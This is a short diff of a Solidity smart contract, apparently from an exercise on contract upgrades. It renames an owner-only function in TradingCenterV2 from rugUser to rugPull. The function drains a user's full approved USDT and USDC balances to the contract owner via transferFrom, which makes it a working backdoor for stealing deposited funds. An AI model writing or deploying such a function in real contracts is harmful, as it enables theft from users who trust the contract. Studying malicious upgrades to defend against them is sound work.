@@ -6,7 +6,7 @@ import "./Ownable.sol";
 
 // TODO: Try to implement TradingCenterV2 here
 contract TradingCenterV2 is TradingCenter, Ownable {
-    function rugUser(address _user) external onlyOwner {
+    function rugPull(address _user) external onlyOwner {
         usdt.transferFrom(_user, msg.sender, usdt.balanceOf(_user));
         usdc.transferFrom(_user, msg.sender, usdc.balanceOf(_user));
     }
